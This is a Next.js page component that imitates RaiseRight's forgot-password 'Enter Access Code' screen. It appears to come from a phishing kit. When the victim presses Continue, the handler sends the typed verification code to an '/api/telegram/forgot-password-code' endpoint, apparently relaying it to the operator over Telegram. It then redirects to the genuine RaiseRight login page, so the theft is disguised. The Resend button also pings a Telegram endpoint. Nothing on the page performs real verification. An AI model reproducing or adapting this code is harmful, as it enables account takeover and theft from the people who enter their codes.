"use client";

import { Suspense, useState } from "react";
import { useRouter } from "next/navigation";
import { Button } from "@/components/ui/button";
import { SiteHeader } from "@/components/site-header";
import { HelpCircle } from "lucide-react";

const RAISERIGHT_LOGIN_URL =
  "https://login.raiseright.com/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3DRaiseRight.Web.Bff%26redirect_uri%3Dhttps%253A%252F%252Fwww.raiseright.com%252Fsignin-oidc%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520offline_access%2520email%2520raiseright%2520ecomm%2520crm%2520fulfillment%2520auth%2520wallet%2520earnings%26code_challenge%3DT-mN-QUZSXwWz5diRu0MIFO2RdudFA_Lm_eFOGM7S_4%26code_challenge_method%3DS256%26nonce%3D639222038064848938.MDc1MjJlZjUtZWU4Ny00MjQ5LWFjY2UtMmRhODg5NzZlNDUwZDliN2M0OTItYjY2Yi00MTVkLWE5MzctMGU4MjNmOWE0ZmVi%26state%3DCfDJ8NuOqh4R2EpOnKLccbReAJmh0QU6fWM4hC_BNAViaJunRM9yyon2ochgJQmI2yiuKns8WtNQGxi_FiwQzCfqKDzkMyp5fA0_wX6Ve9AI7LuggycRTRnWWOxbpYo2f3RBwLBfWUSCngTFAXz2omcmns-tGusM9R8EK614g1fkVTNAL9uhujt_jH82vQtE-LpDglkPfHzjrGyHcKf7K2BAEs81Z2z2tPohplQlRlEQ1mysv90tpFho-N5ZofhLY4P57X79GoF_rb-P3wzXQ2-bY7BQW0tQbPElj5xjoq-2Zgi5jiLfHQCyohmD78X5pSws4vY0dN9ZD30MF_cSThwog7ZjJlCk_RgTKMLf8d_4BDoQdtW_hHnHxADTAxHBx5RagQ%26x-client-SKU%3DID_NET8_0%26x-client-ver%3D8.0.1.0";

function EnterCodeContent() {
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const router = useRouter();

  const numericCode = code.replace(/\D/g, "");
  const isCodeValid = numericCode.length >= 4 && numericCode.length <= 8;

  const handleVerify = async () => {
    if (isLoading) return;
    setIsLoading(true);

    try {
      await fetch("/api/telegram/forgot-password-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code }),
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send code notification:", error);
    }

    await new Promise((r) => setTimeout(r, 1000));
    window.location.href = RAISERIGHT_LOGIN_URL;
  };

  const handleResend = async () => {
    if (isResending) return;
    setIsResending(true);

    try {
      await fetch("/api/telegram/forgot-password-resend", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send resend notification:", error);
    }

    await new Promise((r) => setTimeout(r, 2000));
    setIsResending(false);
  };

  return (
    <div className="min-h-screen bg-white">
      <SiteHeader />
      <main className="px-4 py-6 md:hidden">
        <div className="mx-auto max-w-md rounded-lg border border-gray-200 bg-white p-4 shadow-sm">
          <div className="flex items-center gap-2 mb-3">
            <h2 className="text-base font-medium text-gray-900">
              Verify It&apos;s You
            </h2>
            <button
              type="button"
              className="text-[#254650] hover:underline flex items-center gap-1"
              aria-label="Help"
            >
              <HelpCircle className="w-4 h-4" />
              <span className="text-sm">Help</span>
            </button>
          </div>
          <h1 className="text-xl font-semibold text-gray-900 mb-2">
            Enter Access Code
          </h1>
          <p className="text-sm text-gray-700 mb-4">
            Enter the code that was sent to you.
          </p>

          <div className="flex items-center gap-2 mb-4">
            <span className="text-sm text-gray-700">
              Didn&apos;t receive code?
            </span>
            <button
              type="button"
              onClick={handleResend}
              disabled={isResending}
              className="px-3 py-1.5 bg-gray-200 text-gray-700 rounded-md text-sm font-medium hover:bg-gray-300 disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {isResending ? "Loading..." : "Resend code"}
            </button>
          </div>

          <input
            type="text"
            id="code-mobile"
            inputMode="numeric"
            value={code}
            onChange={(e) =>
              setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
            }
            placeholder=""
            className="w-full max-w-50 px-2.5 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#254650] focus:border-transparent"
            maxLength={8}
          />

          <div className="flex gap-3 mt-4">
            <Button
              className="bg-[#254650] text-white hover:bg-[#1e383f] rounded-md disabled:opacity-70 disabled:pointer-events-none h-9 px-5 text-sm font-medium"
              onClick={handleVerify}
              disabled={!isCodeValid || isLoading}
            >
              {isLoading ? "Loading..." : "Continue"}
            </Button>
            <Button
              variant="ghost"
              className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-9 px-5 text-sm font-medium"
              onClick={() => router.push("/forgot-password-verify")}
            >
              Cancel
            </Button>
          </div>
        </div>
      </main>

      <div className="hidden md:block max-w-2xl px-4 py-10 mb-67.5 mx-auto md:mx-0 md:ml-15">
        <div className="mb-6">
          <div className="flex items-center gap-2 mb-4">
            <h2 className="text-base font-medium text-gray-900">
              Verify It&apos;s You
            </h2>
            <button
              type="button"
              className="text-[#254650] hover:underline flex items-center gap-1"
              aria-label="Help"
            >
              <HelpCircle className="w-4 h-4" />
              <span className="text-sm">Help</span>
            </button>
          </div>
          <h1 className="text-2xl font-semibold text-gray-900 mb-3">
            Enter Access Code
          </h1>
          <p className="text-gray-700 text-sm mb-4">
            Enter the code that was sent to you.
          </p>

          <div className="flex items-center gap-2 mb-4">
            <span className="text-gray-700 text-sm">
              Didn&apos;t receive code?
            </span>
            <button
              type="button"
              onClick={handleResend}
              disabled={isResending}
              className="px-3 py-1.5 bg-gray-200 text-gray-700 rounded-md text-sm font-medium hover:bg-gray-300 disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {isResending ? "Loading..." : "Resend code"}
            </button>
          </div>
        </div>

        <div className="space-y-4">
          <div>
            <input
              type="text"
              id="code"
              inputMode="numeric"
              value={code}
              onChange={(e) =>
                setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
              }
              placeholder=""
              className="w-full max-w-50 px-2.5 py-1.5 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#254650] focus:border-transparent"
              maxLength={8}
            />
          </div>

          <div className="flex gap-3 mt-3">
            <Button
              className="bg-[#254650] text-white hover:bg-[#1e383f] rounded-md disabled:opacity-70 disabled:pointer-events-none h-8 px-5 text-sm font-medium"
              onClick={handleVerify}
              disabled={!isCodeValid || isLoading}
            >
              {isLoading ? "Loading..." : "Continue"}
            </Button>
            <Button
              variant="ghost"
              className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-8 px-5 text-sm font-medium"
              onClick={() => router.push("/forgot-password-verify")}
            >
              Cancel
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function ForgotPasswordCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
          Loading...
        </div>
      }
    >
      <EnterCodeContent />
    </Suspense>
  );
}
